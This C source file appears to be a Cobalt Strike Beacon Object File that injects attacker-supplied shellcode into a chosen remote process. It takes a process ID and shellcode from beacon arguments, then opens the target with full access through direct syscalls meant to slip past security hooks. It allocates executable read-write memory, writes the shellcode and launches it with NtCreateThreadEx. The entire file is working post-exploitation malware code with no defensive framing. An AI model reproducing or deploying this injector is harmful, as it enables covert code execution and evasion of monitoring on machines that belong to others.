#include <windows.h>
#include "beacon.h"
#include "Syscalls.h"
#include "syscalls-asm.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

void go(char * argc, int len)
{
	char* shellcode;
	SIZE_T shell_len;
	datap	parser;
	HANDLE Process_Handle;
	CLIENT_ID id = {0};
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};
	PVOID Alloc = NULL;
	HANDLE Remote_Thread;
	
	BeaconDataParse(&parser, argc, len);
	DWORD pid = BeaconDataInt(&parser);
	shell_len = BeaconDataLength(&parser);
	shellcode = BeaconDataExtract(&parser, NULL);
	id.UniqueProcess = pid;

	NtOpenProcess(&Process_Handle, PROCESS_ALL_ACCESS, &oa, &id);
	NtAllocateVirtualMemory(Process_Handle, &Alloc, 0, &shell_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (Alloc)
	{
		NtWriteVirtualMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
		NtCreateThreadEx(&Remote_Thread, THREAD_ALL_ACCESS, NULL, Process_Handle, Alloc, NULL, FALSE, 0, 0, 0, NULL);
		NtClose(Remote_Thread);
	}
	NtClose(Process_Handle);

}
